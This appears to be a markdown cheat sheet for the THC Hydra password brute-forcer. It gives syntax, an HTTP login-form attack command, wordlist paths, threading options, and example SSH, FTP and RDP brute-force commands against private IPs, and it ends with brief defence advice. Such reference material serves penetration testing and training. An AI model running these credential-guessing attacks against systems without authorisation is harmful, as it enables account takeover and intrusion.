# THC Hydra Reference

## Overview
Hydra is a fast, parallelized network logon cracker built to perform online brute-force attacks against various services.

## Supported Protocols
Hydra supports over 50 protocols, including SSH, FTP, HTTP (GET/POST), SMB, RDP, MySQL, PostgreSQL, VNC, SMTP, POP3, IMAP, and Telnet.

## Basic Syntax
```bash
hydra -l [username] -P [wordlist] [target] [protocol]
```
- `-l`: Specify a single login username.
- `-L`: Specify a file containing usernames.
- `-p`: Specify a single password.
- `-P`: Specify a file containing passwords (wordlist).
- `-s`: Specify a non-standard port.
- `-V`: Verbose mode (shows attempts).

## HTTP Form Brute-force
To crack web login forms, you need the URL, the form parameters, and the failure message.
```bash
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect login"
```
*Note: `^USER^` and `^PASS^` are placeholders Hydra replaces during the attack. `F=` indicates the failure string.*

## Using Wordlists
- **SecLists:** `/usr/share/seclists/Passwords/`
- **RockYou:** `/usr/share/wordlists/rockyou.txt`

## Rate Limiting and Threading
- `-t [tasks]`: Number of parallel connections per target (default is 16). Lower this to avoid crashing the service.
- `-W [time]`: Wait time between responses to avoid rate limiting.

## Restoring Sessions
Hydra saves its state to a `hydra.restore` file. If an attack is interrupted, resume it with:
```bash
hydra -R
```

## Practical Examples
- **SSH:** `hydra -l root -P rockyou.txt 10.0.0.5 ssh -t 4`
- **FTP:** `hydra -L users.txt -P passwords.txt ftp://192.168.1.20`
- **RDP:** `hydra -l Administrator -P rockyou.txt 10.0.0.30 rdp`

## Defense Strategies
- Implement Account Lockout policies (e.g., lock after 5 failed attempts).
- Require Multi-Factor Authentication (MFA/2FA).
- Use CAPTCHAs for web forms.
- Monitor logs for repeated login failures.
